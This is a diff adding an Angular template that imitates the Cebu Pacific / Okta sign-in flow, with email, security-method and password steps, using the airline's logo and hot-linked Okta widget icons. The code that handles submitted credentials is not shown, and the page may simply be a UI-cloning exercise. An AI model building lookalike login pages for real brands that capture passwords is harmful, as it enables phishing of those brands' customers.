@@ -1,0 +1,143 @@
+<div class="login-container">
+    <div class="logo-container">
+        <h1>
+            <img src="https://ok11static.oktacdn.com/fs/bco/1/fs0ej2a1naIy3vHpy4x7" alt="Cebu Pacific" (click)="navigateToHome()">
+        </h1>
+    </div>
+    
+    <!-- Email Step -->
+    <div class="login-contents" *ngIf="currentStep === LoginStep.Email">
+        <h2>Sign in with your MyCebuPacific account</h2>
+        <button class="go-rewards-button" disabled><a href="javascript:void(0)">Sign in with Go Rewards</a></button>
+        <button class="google-button">
+            <a href="javascript:void(0)">
+                <img src="https://www.gstatic.com/marketing-cms/assets/images/d5/dc/cfe9ce8b4425b410b49b7f2dd3f3/g.webp=s96-fcrop64=1,00000000ffffffff-rw" alt="Google logo">
+                Sign in with Google
+            </a>
+        </button>
+        <button class="facebook-button">
+            <a href="javascript:void(0)">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Facebook logo">
+                Sign in with Facebook
+            </a>
+        </button>
+
+        <div class="separation-line"><span>OR</span></div>
+
+        <label for="email">Email Address</label>
+        <div class="email-container">
+              <input type="text" id="email" [(ngModel)]="email" name="email">
+        </div>
+        <div class="login-button">
+            <button type="button" (click)="proceedToPassword()">Next</button>
+        </div>
+        <hr>
+        <div class="signup-info">
+            <span>Don't have an account?</span>
+            <span class="signup-link"><a data-se="enroll" href="/signup" class="link js-enroll">Sign up</a></span>
+        </div>
+    </div>
+
+    <!-- Password Step (Security Methods) -->
+    <div class="login-contents" *ngIf="currentStep === LoginStep.SecurityMethod">
+        <h2>Verify it's you with security method</h2>
+        <div class="user-email-display">
+            <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#e3e3e3"><path d="M234-276q51-39 114-61.5T480-360q69 0 132 22.5T726-276q35-41 54.5-93T800-480q0-133-93.5-226.5T480-800q-133 0-226.5 93.5T160-480q0 59 19.5 111t54.5 93Zm246-164q-59 0-99.5-40.5T340-580q0-59 40.5-99.5T480-720q59 0 99.5 40.5T620-580q0 59-40.5 99.5T480-440Zm0 360q-83 0-156-31.5T197-197q-54-54-85.5-127T80-480q0-83 31.5-156T197-763q54-54 127-85.5T480-880q83 0 156 31.5T763-763q54 54 85.5 127T880-480q0 83-31.5 156T763-197q-54 54-127 85.5T480-80Zm0-80q53 0 100-15.5t86-44.5q-39-29-86-44.5T480-280q-53 0-100 15.5T294-220q39 29 86 44.5T480-160Zm0-360q26 0 43-17t17-43q0-26-17-43t-43-17q-26 0-43 17t-17 43q0 26 17 43t43 17Zm0-60Zm0 360Z"/></svg>
+            <span>{{ email }}</span>
+        </div>
+        
+        <p>Select from the following options</p>
+        
+        <div class="security-option email-option">
+            <span class="option-content">
+                <div class="icon-circle">
+                    <img src="https://ok11static.oktacdn.com/assets/js/sdk/okta-signin-widget/7.29.3/img/icons/mfa/email_70x70.png" alt="Password" class="method-icon">
+                </div>
+                Email
+            </span>
+            <div class="select-button"><a href="javascript:void(0)">Select</a></div>
+        </div>
+
+        <div class="security-option password-option">
+            <span class="option-content">
+                <div class="icon-circle">
+                    <img src="https://ok11static.oktacdn.com/assets/js/sdk/okta-signin-widget/7.29.3/img/icons/mfa/password_70x70.png" alt="Email" class="method-icon">
+                </div>
+                Password
+            </span>
+            <div class="select-button">
+                <a href="javascript:void(0)" 
+                   (click)="selectPasswordMethod(); $event.preventDefault()">
+                   Select
+                </a>
+            </div>
+        </div>
+
+        <div class="back-link-container">
+            <a href="javascript:void(0)" 
+               class="back-link" 
+               (click)="goBackToEmail(); $event.preventDefault()">
+               Back to sign in
+            </a>
+        </div>
+    </div>
+
+    <!-- Password Input Step -->
+    <div class="login-contents" *ngIf="currentStep === LoginStep.PasswordInput">
+        <div class="security-method-header">
+            <div class="icon-circle-pass">
+                <img src="https://ok11static.oktacdn.com/assets/js/sdk/okta-signin-widget/7.29.3/img/icons/mfa/password_70x70.png" 
+                     alt="Password" 
+                     class="method-icon">
+            </div>
+            <h2 class="verify-title">Verify with your password</h2>
+        </div>
+
+        <div class="user-email-display">
+            <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#e3e3e3">
+                <path d="M234-276q51-39 114-61.5T480-360q69 0 132 22.5T726-276q35-41 54.5-93T800-480q0-133-93.5-226.5T480-800q-133 0-226.5 93.5T160-480q0 59 19.5 111t54.5 93Zm246-164q-59 0-99.5-40.5T340-580q0-59 40.5-99.5T480-720q59 0 99.5 40.5T620-580q0 59-40.5 99.5T480-440Zm0 360q-83 0-156-31.5T197-197q-54-54-85.5-127T80-480q0-83 31.5-156T197-763q54-54 127-85.5T480-880q83 0 156 31.5T763-763q54 54 85.5 127T880-480q0 83-31.5 156T763-197q-54 54-127 85.5T480-80Zm0-80q53 0 100-15.5t86-44.5q-39-29-86-44.5T480-280q-53 0-100 15.5T294-220q39 29 86 44.5T480-160Zm0-360q26 0 43-17t17-43q0-26-17-43t-43-17q-26 0-43 17t-17 43q0 26 17 43t43 17Zm0-60Zm0 360Z"/>
+            </svg>
+            <span class="email-text">{{ email }}</span>
+        </div>
+
+        <div class="password-input">
+            <label for="password">Password</label>
+            <div class="password-container">
+                <input type="password" 
+                       id="password" 
+                       [(ngModel)]="password" 
+                       name="password"
+                       placeholder="Enter your password">
+            </div>
+        </div>
+
+        <div class="verify-actions">
+            <button type="button" 
+                    class="verify-button"
+                    (click)="submitLogin()">
+                Verify
+            </button>
+            
+            <div class="password-links">
+                <a href="javascript:void(0)" 
+                   class="forgot-password"
+                   (click)="goBackToPasswordStep(); $event.preventDefault()">
+                    Forgot Password?
+                </a>
+                <a href="javascript:void(0)" 
+                   class="alternative-method"
+                   (click)="goBackToPasswordStep(); $event.preventDefault()">
+                    Verify with something else
+                </a>
+                <a href="javascript:void(0)" 
+                   class="back-link"
+                   (click)="goBackToEmail(); $event.preventDefault()">
+                    Back to sign in
+                </a>
+            </div>
+        </div>
+        <div *ngIf="errorMessage" class="error-message">
+            {{ errorMessage }}
+          </div>
+    </div>
+</div>
